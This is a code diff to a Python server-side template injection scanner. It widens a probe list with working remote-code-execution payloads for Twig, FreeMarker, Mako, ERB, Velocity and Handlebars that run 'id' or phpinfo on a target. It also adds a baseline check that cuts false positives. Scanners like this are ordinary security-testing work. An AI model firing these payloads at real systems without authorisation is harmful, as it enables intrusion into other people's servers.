@@ -17,21 +17,44 @@ def _marker(n: int) -> str:
 
 
 SSTI_PROBES = [
-    ("{{7*7}}",                             "49",     "Jinja2/Twig"),
-    ("{{7*'7'}}",                           "7777777", "Jinja2"),
-    ("${7*7}",                              "49",     "FreeMarker/Velocity/Spring EL"),
-    ("#{7*7}",                              "49",     "Thymeleaf/Ruby ERB"),
-    ("<%= 7*7 %>",                          "49",     "ERB/JSP"),
-    ("*{7*7}",                              "49",     "Thymeleaf SpEL"),
-    ("@(7*7)",                              "49",     "Razor"),
-    ("{{77*77}}",                           "5929",   "Jinja2/Twig"),
-    ("${77*77}",                            "5929",   "FreeMarker/Spring EL"),
-    ("{{config}}",                          "Config", "Jinja2 object leak"),
-    ("{{self._TemplateReference__context}}","TemplateReference", "Jinja2 context leak"),
-    ("%7B%7B7*7%7D%7D",                     "49",     "Jinja2 URL-encoded"),
-    ("{{range.init(1,2)}}",                 "1",      "Twig range"),
-    ("{php}echo 7*7;{/php}",               "49",     "Smarty PHP tag"),
-    ("{{7|int*7|int}}",                     "49",     "Jinja2 filters"),
+    # ── Jinja2 / Twig (Python, PHP) ───────────────────────────────────────────
+    ("{{7*7}}",                              "49",          "Jinja2/Twig"),
+    ("{{7*'7'}}",                            "7777777",     "Jinja2 (string multiply)"),
+    ("{{77*77}}",                            "5929",        "Jinja2/Twig double-check"),
+    ("{{7|int*7|int}}",                      "49",          "Jinja2 filters"),
+    ("{{range.init(1,2)}}",                  "1",           "Twig range()"),
+    ("{{_self.env.registerUndefinedFilterCallback('phpinfo')}}{{_self.env.getFilter('x')}}", "phpinfo", "Twig _self RCE"),
+    # ── FreeMarker / Velocity / Spring EL (Java) ──────────────────────────────
+    ("${7*7}",                               "49",          "FreeMarker/Velocity/Spring EL"),
+    ("${77*77}",                             "5929",        "FreeMarker/Spring EL double-check"),
+    ("#{7*7}",                               "49",          "Thymeleaf/Ruby ERB"),
+    ("*{7*7}",                               "49",          "Thymeleaf SpEL"),
+    ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+                                             "uid=",        "FreeMarker Execute RCE"),
+    ("${class.getResource(\"/\").path}",     "/",           "Spring EL path disclosure"),
+    # ── Tornado / Mako / Chameleon (Python) ───────────────────────────────────
+    ("{% set x = 7*7 %}{{x}}",              "49",          "Tornado/Jinja2 set"),
+    ("${7*7}",                               "49",          "Mako"),
+    ("<%! import os %><%=os.popen('id').read()%>", "uid=",  "Mako RCE"),
+    # ── Handlebars / Nunjucks / Pebble (JS / Java) ───────────────────────────
+    ("{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return 49;\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
+     "49", "Handlebars prototype pollution"),
+    ("{{7 * 7}}",                            "49",          "Nunjucks/Handlebars"),
+    # ── ERB / JSP / Razor (Ruby, Java, .NET) ─────────────────────────────────
+    ("<%= 7*7 %>",                           "49",          "ERB/JSP"),
+    ("<%= `id` %>",                          "uid=",        "ERB shell RCE"),
+    ("@(7*7)",                               "49",          ".NET Razor"),
+    # ── Smarty (PHP) ──────────────────────────────────────────────────────────
+    ("{php}echo 7*7;{/php}",                "49",          "Smarty PHP tag"),
+    ("{math equation=\"7*7\"}",              "49",          "Smarty math"),
+    # ── Velocity (Java) ──────────────────────────────────────────────────────
+    ("#set($x=7*7)${x}",                    "49",          "Velocity #set"),
+    ("#set($rt=$class.forName('java.lang.Runtime'))#set($exec=$rt.getMethod('exec',''.class))#set($out=$exec.invoke($rt.getRuntime(),['id']))${out}", "Process", "Velocity RCE"),
+    # ── URL-encoded fallback ──────────────────────────────────────────────────
+    ("%7B%7B7*7%7D%7D",                      "49",          "Jinja2 URL-encoded"),
+    # ── Jinja2 object leak (info disclosure) ─────────────────────────────────
+    ("{{config}}",                           "Config",      "Jinja2 config object leak"),
+    ("{{self._TemplateReference__context}}", "TemplateReference", "Jinja2 context leak"),
 ]
 
 CMD_PROBES = [
@@ -206,6 +229,22 @@ class SSTIProver:
             "/api/report", "/api/v1/render", "/api/format",
             "/api/v1/template", "/api/notify",
         ]
+
+        # ── Pre-fetch per-path baselines (false-positive prevention) ──────────
+        # If a response ALREADY contains the expected value (e.g. "49") before
+        # we inject anything, that is a calculator/counter page — not SSTI.
+        # Fetch once per path with a neutral "test" value and cache the body.
+        baseline_cache: dict[str, str] = {}
+        for path in ssti_targets:
+            try:
+                _, b_body, _ = await self._request(
+                    sess, "GET", self.target + path,
+                    params={"q": "baseline_check_xyz"}, timeout=8)
+                baseline_cache[path] = b_body or ""
+            except Exception:
+                baseline_cache[path] = ""
+            await delay(0.04)
+
         for payload, expected, engine in SSTI_PROBES:
             for path in ssti_targets:
                 url = self.target + path
@@ -215,12 +254,18 @@ class SSTIProver:
                     await delay(0.1)
                     if s is None or s == 404:
                         continue
-                    if expected in (body or "") and payload not in (body or ""):
+                    # Baseline check: expected value must NOT already be in the
+                    # pre-fetched baseline response — otherwise it is a natural
+                    # constant (e.g. a counter showing "49") not template evaluation.
+                    if (expected in (body or "")
+                            and payload not in (body or "")
+                            and expected not in baseline_cache.get(path, "")):
                         proof = (
                             f"GET {url}?{param}={quote(payload)}\n"
                             f"  HTTP {s}\n"
                             f"  Template evaluated! Input '{payload}' -> output contains '{expected}'\n"
                             f"  Engine: {engine}\n"
+                            f"  Baseline did NOT contain '{expected}' — confirmed SSTI\n"
                             f"  Body preview: {body[:600]}"
                         )
                         self._finding(
@@ -262,7 +307,11 @@ class SSTIProver:
                     await delay(0.1)
                     if s is None or s == 404:
                         continue
-                    if expected in (body or "") and payload not in (body or ""):
+                    # Apply same baseline-check as GET probes — only flag if
+                    # expected value was NOT present in the pre-fetched baseline.
+                    if (expected in (body or "")
+                            and payload not in (body or "")
+                            and expected not in baseline_cache.get(path, "")):
                         proof = (
                             f"POST {url}  body: {{\"{field}\":\"{payload}\"}}\n"
                             f"  HTTP {s}\n"
